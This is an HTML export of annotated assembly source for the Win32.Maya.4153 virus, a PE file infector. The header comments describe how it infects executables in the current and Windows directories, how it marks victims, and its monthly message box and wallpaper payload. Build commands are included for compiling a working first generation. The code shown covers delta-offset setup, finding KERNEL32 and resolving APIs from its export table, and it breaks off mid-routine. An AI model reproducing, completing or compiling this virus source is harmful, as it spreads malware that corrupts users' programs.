<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         Win32.Maya.4153 virus</span><span class="sc0">
</span><span class="sc1">;       disassembly done by peon</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Maya is a nonresident PE infector,which searches for victims in the current,</span><span class="sc0">
</span><span class="sc1">; and the windows directories.It may infect up to 10 files per round(or so).</span><span class="sc0">
</span><span class="sc1">; On the 1st of any month,infected files display a messagebox and</span><span class="sc0">
</span><span class="sc1">; set the wallpaper to 'SLAM'.Uses memory mapped files.</span><span class="sc0">
</span><span class="sc1">; On start,Maya scans the host's imports for GetModuleHandleA for its purposes,</span><span class="sc0">
</span><span class="sc1">; then looks up apis and searches for exe's in the current and windows</span><span class="sc0">
</span><span class="sc1">; dirs.Appends itself to the end of the exe's by enlarging the last section</span><span class="sc0">
</span><span class="sc1">; of the file.Size growth is 4153 bytes (filesize rounded up to file alignment).</span><span class="sc0">
</span><span class="sc1">; Infection mark is 'WM' in the checksum field of the dos exe header.</span><span class="sc0">
</span><span class="sc1">; (Files that cant be infected will carry this however)</span><span class="sc0">
</span><span class="sc1">; Has minor bugs (treats exe header field 3Ch as a word (16bit) etc etc).</span><span class="sc0">
</span><span class="sc1">; Seems to contain code that is never executed(possibly inclomplete)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; note:ignore the @xxxx stuff.They were important only while disassembling</span><span class="sc0">
</span><span class="sc1">; note2:you will notice that the host's entry point is hardcoded to 3000h</span><span class="sc0">
</span><span class="sc1">; if you compile with Borland stuff,that doesnt make a difference but</span><span class="sc0">
</span><span class="sc1">; otherwise you might face problems running the first generation.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;compilation:</span><span class="sc0">
</span><span class="sc1">;tasm32 /m /ml wm.asm</span><span class="sc0">
</span><span class="sc1">;tlink32 wm,,,import32.lib /Tpe</span><span class="sc0">
</span><span class="sc1">; ..and</span><span class="sc0">
</span><span class="sc1">;pewrsec wm.exe</span><span class="sc0">
</span><span class="sc1">; ...to avoid page faults of 1st generation</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc2">.386</span><span class="sc0">            </span><span class="sc1">;i do not comment these</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">     </span><span class="sc1">;because i guess these are well-known</span><span class="sc0">
            </span><span class="sc1">;and boring</span><span class="sc0">


</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">          </span><span class="sc1">;1st generation needs this</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">     </span><span class="sc1">;maya needs that the host imports</span><span class="sc0">
                    </span><span class="sc1">;this function</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;define two structures so need no includes</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_find_data</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">        </span><span class="sc1">;finddata structure for file searches</span><span class="sc0">
    </span><span class="sc5">_attr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_creatlo</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_creathi</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_lastalo</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_lastahi</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_lastwlo</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_lastwhi</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_sizehi</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_sizelo</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_res0</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_res1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">_fname</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">;the only important field for us</span><span class="sc0">
    </span><span class="sc5">_altname</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      
</span><span class="sc5">_find_data</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">win32systime</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">  </span><span class="sc1">;system time structure for payload checking</span><span class="sc0">
    </span><span class="sc5">wyear</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">wmonth</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">wdow</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">wday</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;we are interested in checking the day</span><span class="sc0">
    </span><span class="sc5">whour</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">wmin</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">wsec</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">wmillisec</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">win32systime</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">


</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc1">;------------------- viral code begins here -----------------------</span><span class="sc0">

</span><span class="sc5">maya_length</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">maya_end</span><span class="sc4">-</span><span class="sc5">maya_start</span><span class="sc0"> </span><span class="sc1">;size of viral code</span><span class="sc0">
</span><span class="sc5">maya_start</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;calculate delta offset and get a handle to KERNEL32.dll</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">maya</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">        </span><span class="sc1">;store ebp on stack</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_flexible_entry</span><span class="sc1">;flexible entry point</span><span class="sc0">
</span><span class="sc5">maya_flexible_entry</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">;will calculate delta offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_flexible_entry</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">       </span><span class="sc1">;RVA of viral section,hardcoded</span><span class="sc0">
</span><span class="sc5">maya_rva_of_viral_section</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;got imagebase</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_imagebase</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">;store imagebase</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_getmodulehandlea</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">     </span><span class="sc1">;fetch ptr to 'GetModulaHandleA' string</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_getmodulehandlea_len</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;fetch string length</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">        </span><span class="sc1">;save delta</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_lookup_getmodulehandle</span><span class="sc0">    </span><span class="sc1">;search for import in host</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">;get delta bk</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">;failed?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">maya_restart_host</span><span class="sc0">    </span><span class="sc1">;yes,abort</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_getmodulehandlea_add</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;store address</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">        </span><span class="sc1">;push delta</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_k32</span><span class="sc0"> </span><span class="sc1">;fetch ptr to 'KERNEL32.dll' string</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">     </span><span class="sc1">;add delta</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">;store parameter</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;call GetModuleHandleA('KERNEL32.dll')</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">;get delta bk</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_addof_k32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;store add off K32</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;look up api's</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_getmodulehandlea_len</span><span class="sc0"> </span><span class="sc1">;add of length of 1st string</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">     </span><span class="sc1">;plus delta offset</span><span class="sc0">
</span><span class="sc5">maya_lookup_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get string length</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc12">'MAYA'</span><span class="sc0">      </span><span class="sc1">;end of api names?      </span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">maya_lookup_done</span><span class="sc0"> </span><span class="sc1">;yes</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">;skip length of string</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">;store ptr</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;edi points to where we want result</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_get_apis</span><span class="sc0">  </span><span class="sc1">;look up api</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;store add</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">;go to add of next</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">maya_lookup_loop</span><span class="sc0">    </span><span class="sc1">;and branch</span><span class="sc0">
</span><span class="sc5">maya_lookup_done</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_infection_counter</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;kill counter</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;search for executables and infect them</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_process_current_directory</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_process_windows_directory</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;lookup a few more apis--possibly incomplete</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_lookup_more</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;payload check</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_payload</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;jump to host</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">maya_restart_host</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_entry_of_host</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get host entry rva</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_imagebase</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;add imagebase</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">;restore ebp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;save return address</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and jump to host</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;get api addresses needed for infection</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">maya_get_apis</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_addof_k32</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get add of K32</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">     </span><span class="sc1">;is it an exe?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">maya_get_apis_return_failure</span><span class="sc1">;nope,abort</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;zero register</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;ptr to PE header</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_addof_k32</span><span class="sc4">]</span><span class="sc1">;plus K32 base</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;into esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">     </span><span class="sc1">;is it a PE?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">maya_get_apis_return_failure</span><span class="sc1">;nope,abort</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get exports rva in K32</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_addof_k32</span><span class="sc4">]</span><span class="sc1">;plus K32 base</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_addof_k32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_eat</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;ptrs to exported names</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_addof_k32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_expnames</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;ptrs to export ordinals</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_addof_k32</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_eord</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;zero register</span><span class="sc0">
</span><span class="sc5">maya_get_apis_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">;save string length</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;esi=ptr to name that is searched for</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_expnames</span><span class="sc4">]</span><span class="sc1">;ptr to exported names</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;fetch ptr to exported fuction name</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_addof_k32</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;add K32 base</span><span class="sc0">
    </span><span class="sc6">repe</span><span class="sc0">                </span><span class="sc1">;compare names</span><span class="sc0">
    </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;perfect match?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_get_apis_found</span><span class="sc0">      </span><span class="sc1">;yes</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">;nope,proceed with next</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;get string length back</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">maya_get_apis_loop</span><span class="sc0">      </span><span class="sc1">;and compare with next name in K32</span><span class="sc0">
</span><span class="sc5">maya_get_apis_found</span><span class="sc4">:</span><span class="sc0">    
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;remove ecx from stack</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;halve eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_eord</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;fix ptr to eord's</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;zero ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;fetch eord</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;*4</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_eat</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;add exports add table offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;get rva of function</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_addof_k32</span><span class="sc4">]</span><span class="sc1">;add base of K32</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;and return to caller</span><span class="sc0">
</span><span class="sc5">maya_get_apis_return_failure</span><span class="sc4">:</span><span class="sc0">
